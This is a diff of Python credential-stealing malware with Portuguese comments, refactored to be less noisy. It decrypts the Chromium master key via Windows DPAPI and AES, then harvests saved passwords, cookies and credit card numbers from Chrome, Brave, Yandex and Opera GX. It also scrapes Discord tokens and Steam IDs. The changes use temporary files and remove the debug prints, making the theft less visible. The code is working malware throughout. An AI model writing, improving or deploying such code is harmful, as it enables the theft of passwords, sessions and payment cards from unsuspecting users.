@@ -1,9 +1,9 @@
 import os
 import re
 import subprocess
+from shutil import copy2
 from base64 import b64decode
 from json import loads
-from shutil import copy2
 from sqlite3 import connect
 import win32crypt
 from Crypto.Cipher import AES
@@ -12,6 +12,7 @@ import requests
 import platform
 import uuid
 import sqlite3
+import tempfile
 
 # Obtendo os diretórios do sistema
 local = os.getenv('LOCALAPPDATA')
@@ -26,7 +27,7 @@ tokenPaths = {
     'Brave': rf"{local}\BraveSoftware\Brave-Browser\User Data\Default",
     'Yandex': rf"{local}\Yandex\YandexBrowser\User Data\Default",
     'OperaGX': rf"{roaming}\Opera Software\Opera GX Stable",
-    'Steam': rf"{roaming}\Steam"  # Adicionado suporte para Steam
+    'Steam': rf"{roaming}\Steam"
 }
 
 browser_loc = {
@@ -77,8 +78,10 @@ def decrypt_token(buff, master_key):
 # Função para extrair tokens do Discord
 def get_tokens(path):
     tokens = set()  # Usar um conjunto para evitar duplicatas
-    lev_db = f"{path}\\Local Storage\\leveldb"
-    loc_state = f"{path}\\Local State"
+    lev_db = rf"{path}\Local Storage\leveldb"
+    loc_state = rf"{path}\Local State"
+
+
 
 
     if os.path.exists(loc_state):
@@ -90,7 +93,7 @@ def get_tokens(path):
                     with open(os.path.join(lev_db, file_name), "r", errors='ignore') as files:
                         for line in files.readlines():
                             line = line.strip()
-                            token_match = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
+                            token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                             for token in token_match:
                                 decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                                 if decrypted:
@@ -110,23 +113,17 @@ def get_tokens(path):
                     continue
     return list(tokens)  # Retorna como uma lista
 
+# Função para obter tokens da Steam
 def get_steam_tokens(path):
     steam_tokens = []
     config_file = os.path.join(path, 'config', 'loginusers.vdf')
     if os.path.exists(config_file):
-        print(f"Arquivo encontrado: {config_file}")
         try:
             with open(config_file, 'r', encoding='utf-8') as file:
                 data = file.read()
                 steam_tokens = re.findall(r'"SteamID"\s*"(\d+)"', data)
-                if steam_tokens:
-                    print(f"Tokens encontrados: {steam_tokens}")
-                else:
-                    print("Nenhum token da Steam encontrado.")
         except Exception as e:
             print(f"Erro ao extrair tokens da Steam: {e}")
-    else:
-        print(f"Arquivo não encontrado: {config_file}")
     return steam_tokens
 
 # Funções para descriptografar dados do navegador
@@ -137,7 +134,6 @@ def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 
 # Função para descriptografar o conteúdo do navegador e extrair os dados
-# Função para descriptografar o conteúdo do navegador e extrair os dados
 def decrypt_browser(LocalState, LoginData, CookiesFile, name):
     message = ""
     try:
@@ -147,11 +143,10 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                 master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-                # Descriptografar os logins
-                if os.path.exists(LoginData):
-                    try:
-                        copy2(LoginData, "TempMan.db")
-                        with connect("TempMan.db") as conn:
+                with tempfile.NamedTemporaryFile(delete=True) as temp_login:
+                    if os.path.exists(LoginData):
+                        copy2(LoginData, temp_login.name)
+                        with connect(temp_login.name) as conn:
                             cur = conn.cursor()
                             cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                             message += f"\n*** {name} - Login ***\n"
@@ -168,16 +163,11 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                                 except Exception as e:
                                     print(f"Erro ao descriptografar login: {e}")
                                     continue
-                    except PermissionError:
-                        print("Login Data já está sendo usado por outro processo, pulando...")
-                    except Exception as e:
-                        print(f"Erro ao copiar Login Data: {e}")
 
-                # Descriptografar os cookies
-                if os.path.exists(CookiesFile):
-                    try:
-                        copy2(CookiesFile, "CookMe.db")
-                        with connect("CookMe.db") as conn:
+                with tempfile.NamedTemporaryFile(delete=True) as temp_cookie:
+                    if os.path.exists(CookiesFile):
+                        copy2(CookiesFile, temp_cookie.name)
+                        with connect(temp_cookie.name) as conn:
                             curr = conn.cursor()
                             curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
                             message += f"\n*** {name} - Cookies ***\n"
@@ -193,10 +183,6 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                                 except Exception as e:
                                     print(f"Erro ao descriptografar cookie: {e}")
                                     continue
-                    except PermissionError:
-                        print("Cookies File já está sendo usado por outro processo, pulando...")
-                    except Exception as e:
-                        print(f"Erro ao copiar Cookies File: {e}")
     except Exception as e:
         print(f"Erro ao descriptografar dados do navegador: {e}")
 
@@ -212,13 +198,11 @@ def extrair_cartao_credito(LocalState, LoginData):
                 master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-                # Descriptografar informações de cartão de crédito
-                if os.path.exists(LoginData):
-                    try:
-                        copy2(LoginData, "TempCard.db")
-                        with connect("TempCard.db") as conn:
+                with tempfile.NamedTemporaryFile(delete=True) as temp_card:
+                    if os.path.exists(LoginData):
+                        copy2(LoginData, temp_card.name)
+                        with connect(temp_card.name) as conn:
                             cur = conn.cursor()
-                            # Tentar selecionar os dados de cartões de crédito
                             try:
                                 cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                                 message += "\n*** Cartões de Crédito ***\n"
@@ -237,10 +221,6 @@ def extrair_cartao_credito(LocalState, LoginData):
                                         continue
                             except sqlite3.OperationalError as e:
                                 print(f"Tabela credit_cards não encontrada: {e}")
-                    except PermissionError:
-                        print("Login Data já está sendo usado por outro processo, pulando...")
-                    except Exception as e:
-                        print(f"Erro ao copiar Login Data: {e}")
     except Exception as e:
         print(f"Erro ao descriptografar cartões de crédito: {e}")
 
@@ -248,14 +228,14 @@ def extrair_cartao_credito(LocalState, LoginData):
 
 # Funções para obter o caminho correto dos arquivos do navegador
 def Local_State(path):
-    return f"{path}\\User Data\\Local State"
-
+    return rf"{path}\User Data\Local State"
 
 def Login_Data(path):
-    return f"{path}\\User Data\\Default\\Login Data" if "Profile" not in path else f"{path}\\Login Data"
+    return rf"{path}\User Data\Default\Login Data" if "Profile" not in path else rf"{path}\Login Data"
 
 def Cookies(path):
-    return f"{path}\\User Data\\Default\\Network\\Cookies" if "Profile" not in path else f"{path}\\Network\\Cookies"
+    return rf"{path}\User Data\Default\Network\Cookies" if "Profile" not in path else rf"{path}\Network\Cookies"
+
 
 def main_tokens():
     mensagem_tokens = ""
